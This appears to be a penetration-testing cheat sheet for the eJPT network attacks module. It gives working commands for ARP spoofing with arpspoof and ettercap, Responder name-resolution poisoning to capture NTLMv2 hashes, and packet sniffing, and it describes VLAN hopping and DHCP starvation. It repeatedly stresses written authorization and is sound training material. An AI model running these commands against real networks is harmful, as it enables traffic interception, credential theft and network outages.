# Network-Based Attacks Cheat Sheet

This document covers Layer 2/3 network attacks — ARP spoofing, MITM positioning, LLMNR/NBT-NS/mDNS poisoning, packet sniffing, VLAN hopping, and DHCP starvation — that make up eJPT's "Network-Based Attacks" module, distinct from host-level exploitation and AD-specific attacks covered elsewhere in this collection. Hashes captured here with Responder feed directly into `hashcat-cheatsheet-professional.md` for offline cracking and `crackmapexec-cheatsheet-professional.md` for relay/pass-the-hash follow-up, so treat this file as the entry point of that chain rather than the end of it.

---

## Table of Contents

1. [Why Network-Based Attacks Matter on an Internal Engagement](#1-why-network-based-attacks-matter-on-an-internal-engagement)
2. [ARP Spoofing / ARP Poisoning](#2-arp-spoofing--arp-poisoning)
3. [MITM Positioning — What It Enables](#3-mitm-positioning--what-it-enables)
4. [LLMNR/NBT-NS/mDNS Poisoning with Responder](#4-llmnrnbt-nsmdns-poisoning-with-responder)
5. [Packet Sniffing with tcpdump/Wireshark](#5-packet-sniffing-with-tcpdumpwireshark)
6. [VLAN Hopping (Concept)](#6-vlan-hopping-concept)
7. [DHCP Starvation / Rogue DHCP (Concept)](#7-dhcp-starvation--rogue-dhcp-concept)
8. [Quick Command Reference](#8-quick-command-reference)

---

## 1. Why Network-Based Attacks Matter on an Internal Engagement

eJPT's internal/grey-box labs put you on the same broadcast segment as the targets, so attacks that only work when you already have local network access — ARP spoofing, LLMNR poisoning, sniffing — are often the fastest path from "on the network" to "have credentials."

- Most corporate networks trust Layer 2/3 protocols (ARP, LLMNR, NBT-NS, DHCP) by design, with no authentication — any host on the segment can answer for them.
- These attacks require no vulnerability, no exploit, and no prior credentials — only network position, which is exactly what an internal pentest or a compromised workstation gives you.
- They're frequently the first foothold technique in a grey-box assessment, run before any host-level exploitation (`linux-windows-pentest-cheatsheet-professional.md`) or AD enumeration (`active-directory-enumeration-cheatsheet-professional.md`) even begins.

> **Note:** Every technique in this document manipulates shared network infrastructure (ARP tables, name resolution, DHCP leases). Run these only within written authorization (scope/RoE) — ARP spoofing and rogue DHCP servers can disrupt production traffic for hosts that are not even in scope.

---

## 2. ARP Spoofing / ARP Poisoning

ARP spoofing abuses the fact that ARP has no authentication — a host will accept any ARP reply and update its cache, which lets an attacker claim to be the gateway (or another host) and redirect traffic through itself.

```bash
# Enable IP forwarding first so the victim's traffic still reaches the real gateway
echo 1 > /proc/sys/net/ipv4/ip_forward

# arpspoof: tell the victim that the attacker is the gateway
arpspoof -i eth0 -t <victim-ip> <gateway-ip>

# arpspoof: tell the gateway that the attacker is the victim (run in a second terminal for full bidirectional MITM)
arpspoof -i eth0 -t <gateway-ip> <victim-ip>

# ettercap: same result via its ARP-poison plugin, text UI, targets both hosts by default
ettercap -T -q -i eth0 -M arp:remote /<victim-ip>// /<gateway-ip>//
```

| Tool | Notes |
|---|---|
| `arpspoof` (dsniff suite) | Simple, one direction per invocation — run twice for full MITM |
| `ettercap` | Built-in ARP-poison MITM mode plus sniffing/filtering in one tool |

> **Note:** ARP spoofing works because hosts blindly trust unsolicited ARP replies — it is a protocol design gap, not a bug, so it works against virtually any unsegmented LAN.

---

## 3. MITM Positioning — What It Enables

Once ARP spoofing (or another Layer 2 technique) places the attacker between the victim and the gateway, every packet the victim sends off-segment flows through the attacker first.

- **Traffic interception:** all victim traffic to the internet/other subnets is visible in plaintext for unencrypted protocols (HTTP, FTP, Telnet, SMTP).
- **Credential capture:** login forms, basic auth, and any cleartext-protocol credentials can be read directly out of the intercepted stream.
- **Session/cookie theft:** unencrypted session tokens can be lifted and reused without ever touching the victim's password.
- **Downgrade/redirect opportunities:** the MITM position can inject DNS spoofing or SSL-strip style redirects to push a victim toward attacker-controlled content.
- **Enabler for poisoning attacks:** the same network position that supports ARP spoofing also supports the LLMNR/NBT-NS poisoning in the next section — Responder listens for the traffic this positioning exposes.

> **Note:** Being "on-path" only gets you plaintext protocols and metadata for free — modern TLS traffic still requires additional techniques (cert pinning bypass, SSL stripping) that are out of scope for this document.

---

## 4. LLMNR/NBT-NS/mDNS Poisoning with Responder

LLMNR, NBT-NS, and mDNS are legacy name-resolution fallbacks — when normal DNS fails to resolve a hostname, Windows broadcasts "does anyone know this name?" and Responder answers "yes, that's me," tricking the victim into authenticating to the attacker.

```bash
# Start Responder in default mode, listening on the local interface
responder -I eth0

# Verbose mode — see every request as it comes in
responder -I eth0 -v

# Analyze mode only — observe requests without poisoning (safe recon)
responder -I eth0 -A
```

| Protocol | What it's for | Why it's exploitable |
|---|---|---|
| LLMNR (Link-Local Multicast Name Resolution) | Fallback name resolution when DNS fails | Broadcast query — any host can reply, no authentication |
| NBT-NS (NetBIOS Name Service) | Legacy Windows name resolution | Same broadcast trust problem as LLMNR |
| mDNS (Multicast DNS) | Zero-config name resolution (mostly Apple/Bonjour) | Also answered by any listener on the segment |

- A mistyped share name, a dead DNS entry, or a misconfigured application triggers one of these broadcasts.
- Responder answers first, and the victim's SMB client authenticates to it automatically, sending an **NTLMv2 hash**.
- Captured hashes are written to Responder's log directory (`/usr/share/responder/logs/` by default) as `<HASH-TYPE>-<VICTIM-IP>.txt`.

**Where the hashes go next:**

1. Crack them offline with `hashcat-cheatsheet-professional.md` (NTLMv2 is hashcat mode `5600`).
2. If cracking fails or isn't the goal, relay the hash instead of cracking it — use `crackmapexec-cheatsheet-professional.md` (or ntlmrelayx) for SMB relay / pass-the-hash against hosts where SMB signing is not enforced.

> **Note:** Responder is a poisoning tool, not a passive listener, by default — running it on a live client network will intercept legitimate authentication attempts and should only be done with explicit authorization.

---

## 5. Packet Sniffing with tcpdump/Wireshark

After establishing a MITM position or poisoning name resolution, a packet capture confirms the interception is actually working and lets you pull credentials or hashes straight out of the traffic.

```bash
# tcpdump: capture on an interface, write to a file for later analysis in Wireshark
tcpdump -i eth0 -w capture.pcap

# tcpdump: capture only traffic to/from a specific host
tcpdump -i eth0 host <victim-ip> -w victim-traffic.pcap

# tcpdump: filter for a specific protocol/port (e.g. FTP control channel)
tcpdump -i eth0 port 21 -w ftp-traffic.pcap

# Follow a live capture in the terminal instead of writing to disk
tcpdump -i eth0 -A host <victim-ip>
```

| Tool | Best for |
|---|---|
| `tcpdump` | Fast headless capture/filtering, ideal for scripting or a remote shell |
| Wireshark | Deep protocol inspection, "Follow TCP Stream" to reassemble credentials, `.pcap` review |

- Open `.pcap` files captured with `tcpdump -w` directly in Wireshark for GUI analysis.
- In Wireshark, use `Follow > TCP Stream` on an HTTP/FTP/Telnet session to read captured credentials in plaintext.
- The `smb2` or `ntlmssp` display filters in Wireshark isolate the authentication exchanges that Responder would otherwise capture automatically.

> See `wireshark-advanced-cheatsheet.md` for deeper filter syntax and stream-reassembly techniques.

---

## 6. VLAN Hopping (Concept)

VLAN hopping lets an attacker on one VLAN reach traffic on another VLAN it should not have access to, defeating the segmentation that network design normally relies on.

- **Switch spoofing:** the attacker's host negotiates a trunk link with the switch (mimicking DTP — Dynamic Trunking Protocol), turning its access port into a trunk port that carries all VLANs.
- **Double tagging:** the attacker sends a frame with two 802.1Q VLAN tags; the first switch strips the outer tag (its own native VLAN) and forwards the frame with the inner tag intact, landing it on a different VLAN than the one the attacker is physically on. This only works one direction and typically requires the attacker to be on the native VLAN of the trunk.

> **Note:** eJPT coverage of VLAN hopping is conceptual — know why it works and what it enables (reaching a segmented VLAN from an untrusted one) rather than executing a full trunk negotiation in the exam labs.

---

## 7. DHCP Starvation / Rogue DHCP (Concept)

DHCP has no built-in authentication for either clients or servers, which opens two related attack paths.

- **DHCP starvation:** flood the real DHCP server with bogus requests using spoofed MAC addresses until its address pool is exhausted, denying service to legitimate clients.
- **Rogue DHCP server:** once the pool is exhausted (or simply by racing the legitimate server), stand up an attacker-controlled DHCP server that hands out a malicious default gateway and/or DNS server, positioning the attacker for MITM without ever touching ARP.
- Tools like `yersinia` or `dhcpstarv` automate the starvation flood; a rogue server can be as simple as `dnsmasq` or the Metasploit `auxiliary/server/dhcp` module configured with attacker-controlled options.

> **Note:** DHCP starvation is a denial-of-service technique against real infrastructure — it can take an entire network segment offline and must never be run outside an explicitly authorized, scoped test window.

---

## 8. Quick Command Reference

A single-page lookup for every command covered above.

| Need | Command |
|---|---|
| Enable IP forwarding (before ARP spoofing) | `echo 1 > /proc/sys/net/ipv4/ip_forward` |
| ARP-spoof victim (claim to be gateway) | `arpspoof -i eth0 -t <victim-ip> <gateway-ip>` |
| ARP-spoof gateway (claim to be victim) | `arpspoof -i eth0 -t <gateway-ip> <victim-ip>` |
| ARP MITM via ettercap | `ettercap -T -q -i eth0 -M arp:remote /<victim-ip>// /<gateway-ip>//` |
| Start Responder (default poisoning) | `responder -I eth0` |
| Responder verbose mode | `responder -I eth0 -v` |
| Responder analyze-only (no poisoning) | `responder -I eth0 -A` |
| Capture traffic to file | `tcpdump -i eth0 -w capture.pcap` |
| Capture traffic for one host | `tcpdump -i eth0 host <victim-ip> -w victim-traffic.pcap` |
| Capture a specific port/protocol | `tcpdump -i eth0 port 21 -w ftp-traffic.pcap` |
| Live capture in terminal | `tcpdump -i eth0 -A host <victim-ip>` |

---

*Prepared as a reference for the eJPT host/network pentest module. All techniques should only be used within written authorization (scope/RoE).*
